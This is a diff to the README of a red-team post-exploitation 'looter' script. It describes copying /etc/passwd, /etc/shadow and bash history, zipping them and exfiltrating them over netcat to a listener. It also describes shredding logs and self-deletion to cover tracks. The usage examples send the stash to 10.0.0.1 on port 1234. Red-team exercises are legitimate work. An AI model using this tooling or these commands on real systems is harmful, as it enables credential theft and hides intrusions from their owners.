@@ -3,7 +3,13 @@
 On the 842 Ideas Spreadsheet, Andrew Kramer suggested the idea of creating an automated looting script that will collect relevant data for someone who gained root access to a box.  This is great for red team exercises where the attacker wants to be able to quickly grab useful files and data before getting booted off the system.
 
 ##Purpose
-This script will crawl through a box and quickly collect useful information for an attacker.
+This script will crawl through a box and quickly collect useful information for an attacker.  The script will determine which OS it is on to ensure compatibility before attempting to collect anything.  The nest egg (collection stash) location will be in the present working directory of the script unless specified by the user.
+
+This script makes an attempt is made to copy relevant files including but not limited to /etc/passwd, /etc/shadow, ~/.bash_history, etc to the nest egg location.  Once everything is collected, the files are prepared and zipped for exfil.  Currently, the script uses netcat to create a network connection to a listening post for exfil.
+
+The goal is to be discreet and the script will shred logs, avoid writing to bash_history, and cover its own tracks.
+
+This Python script has been tested on Kali Linux 64 bit with Python 2.7.12.
 
 #Help Screen 
 ```
@@ -22,6 +28,29 @@ optional arguments:
   -r, --remove          remove script after execution
 ```
 #Usage Examples
+
+A collection without any exfiltration can be done with the command below:
+
+```
+python ./looter.py -a -ne
+```
+
+A collection with exfiltration to a specified IP address and port can be done with the command below:
+
+```
+python ./looter.py -a -t 10.0.0.1 -p 1234
+```
+
+Specifying the -r flag will cause the script to be destroyed after execution to cover its tracks:
+
+```
+python ./looter.py -a -t 10.0.0.1 -p 1234 -r
+````
+
+Specifying the -d flag with a valid path will change the default nest egg location:
+```
+python ./looter.py -a -t 10.0.0.1 -p 1234 -d ~/Desktop/
+```
 
 #Other
 
